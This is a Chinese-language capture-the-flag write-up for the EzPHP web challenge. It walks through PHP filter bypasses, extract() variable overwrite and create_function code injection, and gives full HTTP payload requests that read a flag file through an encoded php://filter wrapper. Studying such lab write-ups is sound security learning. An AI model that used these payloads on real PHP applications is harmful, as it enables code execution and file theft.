# [BJDCTF2020]EzPHP

[题目地址](https://buuoj.cn/challenges#[BJDCTF2020]EzPHP)

集齐7道ezphp可以召唤隐藏款吗？

```php
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

有一些经典考点，也有一些之前没见过的。[wp](https://blog.csdn.net/weixin_44037296/article/details/111186863)护体，开始解题。[\$_SERVER](https://www.php.net/manual/zh/reserved.variables.server.php)是一个包含了诸如头信息（header）、路径（path）、以及脚本位置（script locations）等信息的 array。题目中使用的\$_SERVER['QUERY_STRING']返回查询(query)的字符串，也就是GET请求中?后的内容。来看看需要绕过什么。

```php
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```

\$_SERVER['QUERY_STRING']有一个特点：不会对传入键值对进行url解码。等于说我们把查询字符串全部url编码后这些正则全部没用。下一关。

```php
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
```

经典正则漏洞。像这种`^xxx$`的正则只需要在末尾加个换行符%0A就能绕过了。当前payload：

- /1nD3x.php?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A

下一关。

```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```

要求所有查询（post和get）的值不能有英文。这里又是个特性，虽然\$_REQUEST同时接收GET和POST的传参，但POST拥有更高的优先级，当\$_GET和\$_POST中的键相同时，\$_POST的值将覆盖\$_GET的值。那解法显而易见了，用bp发个post包，post数据发送和get同名的参数。

```
POST /1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A HTTP/1.1
Host: 88734034-7928-4073-b847-9974a354e8f5.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

debu=1
```

下一关是简单的php伪协议。

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

有三种方式绕：

- php://input 将POST传入的数据全部当做文件内容
- data://text/plain,<?php phpinfo()?>
- data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

选一种顺眼的就好了。注意bp发包post要发个file把get的覆盖掉。

```
POST /1nD3x.php?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61 HTTP/1.1
Host: 88734034-7928-4073-b847-9974a354e8f5.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

debu=1&file=1
```

下一关的考点也不是很面生。

```php
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

sha1函数和md5一样，无法加密数组，强行加密后会返回NULL。

```php
<?php
$a=['a'];
var_dump(sha1($a));
echo NULL===NULL;
//NULL
//1
```

两个数组加密失败都返回NULL，而两个NULL是强等于的，这就可以简单绕过了。

```
POST /1nD3x.php?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2 HTTP/1.1
Host: 88734034-7928-4073-b847-9974a354e8f5.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

debu=1&file=1
```

最后一关当然是最困难的。

```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```

过滤了很多函数，不让我们直接读flag。分析一下，code和arg两个变量似乎没有明显的赋值语句，不过在上一关的`extract($_GET["flag"]);`是extract变量覆盖漏洞，相当于变量任意控制了。此处考点是[create_function](https://www.php.net/manual/en/function.create-function.php)代码注入，这玩意相当于php曾经的匿名函数，早已废弃，新版本已经移除了。函数效果如下：

```php
$newfunc = create_function('$a,$b', 'return $a+$b;');
//等同于
function newfunc($a,$b){
    return $a+$b;
}
```

这个函数虽然说是动态生成一个函数，但是我感觉内部动态生成实现应该和拼接有点关系。假如我们参数这么传：

```php
$newfunc = create_function('', '}eval($_POST["cmd"]);//');
```

这个创建出来的newfunc会是什么样的呢？第一眼可能觉得，这个函数体是什么东西啊？没头没尾的大括号，莫名其妙的注释符，这能生成？答案是能，效果如下：

```php
function newfunc(){
}eval($_POST["cmd"]);//}
```

开始的大括号闭合原来函数的大括号，之后就能任意写代码了，末尾注释符再把原来的大括号闭合上。现在就能构造payload了，code借用变量覆盖漏洞赋值为create_function，arg则赋值为`}任意代码;//`。至于任意代码那里填什么，看程序有一句`include "flag.php";`，这里面应该有flag变量，用[get_defined_vars()](https://www.runoob.com/php/php-get_defined_vars-function.html) 函数+var_dump全部输出出来。

```
POST /1nD3x.php?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%61%72%67]=}var_dump(get_defined_vars());//&%66%6c%61%67[%63%6f%64%65]=create_function HTTP/1.1
Host: 88734034-7928-4073-b847-9974a354e8f5.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

debu=1&file=1
```

说flag在rea1fl4g.php。接下来按照wp所说，require(rea1fl4g.php)后再用get_defined_vars输出所有变量，会发现flag是假的。于是大佬用取反绕过后拿到了真正的flag。使用require是因为inc和单双引号都被过滤了。还有另一种[解法](https://www.shawroot.cc/815.html#0x05_create_function_dai_ma_zhu_ru)，利用base64decode获取文件名，无需加双引号因为php会自动把没加双引号的内容看作字符串。提供取反解法。

```
POST /1nD3x.php?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//&%66%6c%61%67[%63%6f%64%65]=create_function HTTP/1.1
Host: 88734034-7928-4073-b847-9974a354e8f5.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

debu=1&file=1
```

base64解码得到的内容即可获得flag。